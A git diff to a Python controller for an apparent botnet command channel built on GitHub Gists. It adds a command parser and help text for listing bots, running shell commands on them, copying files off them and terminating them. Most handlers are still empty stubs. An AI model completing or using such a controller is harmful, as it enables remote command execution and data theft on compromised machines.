@@ -3,6 +3,7 @@ import os
 import select
 import shutil
 import sys
+from typing import Optional
 
 from git import GithubGistClient
 
@@ -12,6 +13,7 @@ from git import GithubGistClient
 IMAGES_LIBRARY = '4c7fe7e6d06b0b90ab4848b234209e95'
 CONTROL_IMAGE = 'security.jpg'
 UPDATE_INTERVAL = 30  # seconds
+KEEP_ALIVE_TIMEOUT = 90  # seconds
 
 
 class Controller:
@@ -102,28 +104,143 @@ class Controller:
         # TODO
         pass
 
-    def process_command(self, cmd_str) -> None:
-        print(f"processing command '{cmd_str}'")
-        args = self._parser.parse_args(args=cmd_str.split(sep=' '))
-        print(args)
-        # help
-        # terminate <bot>
-        # do <bot> id
-        # do <bot> who
-        # do <bot> ls <>
-        # run [--shell] [--no-output] <bot>
-        # copyFrom <bot> <file name>
+    @staticmethod
+    def print_help() -> None:
+        print(
+            '\nAvailable commands:\n\n'
+            'Use Ctrl-C to stop and exit the controller.\n\n'
+            'help\n'
+            '  Prints this help.\n'
+            'bots\n'
+            '  Lists all bots and their status.\n'
+            'terminate <bot>\n'
+            '  Terminates the bot.\n'
+            'shell <bot> <command>\n'
+            '  Runs the given command on the bot using the following Python code.\n'
+            '    subprocess.run(args=[<command>], shell=True)\n'
+            '  Note: <command> might contain spaces. Even the leading/trailing spaces are preserved.\n'
+            '  See https://docs.python.org/3.8/library/subprocess.html#subprocess.run.\n'
+            'run <bot> <command>\n'
+            '  Runs the given command on the bot using the following Python code.\n'
+            '    subprocess.run(args=shlex.split(<command>), shell=False)\n'
+            '  Note: <command> might contain spaces. Even the leading/trailing spaces are preserved.\n'
+            '  See https://docs.python.org/3.8/library/subprocess.html#subprocess.run.\n'
+            'copyFrom <bot> <file name>\n'
+            'do <bot> id\n'
+            '  Alias for shell <bot> id\n'
+            'do <bot> who\n'
+            '  Alias for shell <bot> who\n'
+            'do <bot> ls <path>\n'
+            '  Alias for shell <bot> ls -lha\n'
+        )
 
+    def print_bots(self) -> None:
+        print('Bots:')
         pass
+
+    def is_valid_bot(self, bot: str) -> bool:
+        return True
+
+    def process_terminate_command(self, bot) -> None:
+        pass
+
+    def process_run_command(self, bot, shell: bool, cmd: Optional[str]) -> None:
+        if cmd is None:
+            print('Missing <command> argument!')
+            return
+        if cmd == '':
+            print('Invalid empty <command> argument!')
+            return
+        pass
+
+    def process_copy_from_command(self, bot, file_name: Optional[str]) -> None:
+        if file_name is None:
+            print('Missing <file name> argument!')
+            return
+        if file_name == '':
+            print('Invalid empty <file name> argument!')
+            return
+        pass
+
+    def process_do_command(self, bot, action: Optional[str]) -> None:
+        if action is None:
+            print('Missing do action!')
+            return
+        if action == 'id':
+            self.process_run_command(bot, shell=True, cmd='id')
+            return
+        if action == 'who':
+            self.process_run_command(bot, shell=True, cmd='who')
+            return
+        if action.startswith('ls '):
+            path = action[3:]
+            if path == '':
+                print(f"Invalid path '{path}'!")
+                return
+            self.process_run_command(bot, shell=True, cmd='ls -lha ' + path)
+            return
+        print(f"Invalid do action '{action}'!")
+        return
+
+    def process_command(self, cmd_str) -> None:
+        if cmd_str == '':
+            # no command
+            return
+
+        parts = cmd_str.split(sep=' ', maxsplit=1)
+        cmd_name = parts[0]
+
+        if cmd_name == 'help' or cmd_name == '?':
+            self.print_help()
+            return
+
+        if cmd_name == 'bots':
+            self.print_bots()
+            return
+
+        # all other commands should have format <cmd_name> <bot> <...the rest>
+        if len(parts) == 2:
+            sub_parts = parts[1].split(sep=' ', maxsplit=1)
+            bot = sub_parts[0]
+            args_str = sub_parts[1] if len(sub_parts) == 2 else None
+            if not self.is_valid_bot(bot):
+                print(f"Command '{cmd_str}'")
+                print(f"Invalid bot '{bot}' given.")
+                return
+
+            if cmd_name == 'terminate':
+                self.process_terminate_command(bot)
+                return
+            if cmd_name == 'shell':
+                self.process_run_command(bot, shell=True, cmd=args_str)
+                return
+            if cmd_name == 'run':
+                self.process_run_command(bot, shell=False, cmd=args_str)
+                return
+            if cmd_name == 'copyFrom':
+                self.process_copy_from_command(bot, file_name=args_str)
+                return
+            if cmd_name == 'do':
+                self.process_do_command(bot, action=args_str)
+                return
+
+        print(f"Invalid or unknown command '{cmd_str}'!")
+        print(f'Type ? or help to show help.')
 
     def run(self) -> None:
         self._setup()
 
         while True:
-            print('Enter a command. Type help for help.\n> ', end='')
+            print(
+                '\nEnter a command. Use ? or help to show help.\n'
+                f'Auto update in {UPDATE_INTERVAL} seconds. Press enter to force update.\n'
+                '> ',
+                end='',
+            )
             ready_read, _, _ = select.select([sys.stdin], [], [], UPDATE_INTERVAL)
             if len(ready_read) == 1:
-                cmd_str = sys.stdin.readline().strip()
+                # do not remove trailing whitespace except newline chars
+                cmd_str = sys.stdin.readline().lstrip().rstrip('\r\n')
                 self.process_command(cmd_str)
             else:
                 # so we do not write to the prompt line
@@ -133,7 +250,8 @@ class Controller:
 
         pass
 
-    def stop(self) -> None:
+    @staticmethod
+    def stop() -> None:
         print('Stopping the controller. Note that the bots might still be running.')
         print('Use terminate command to stop a specific bot.')
 
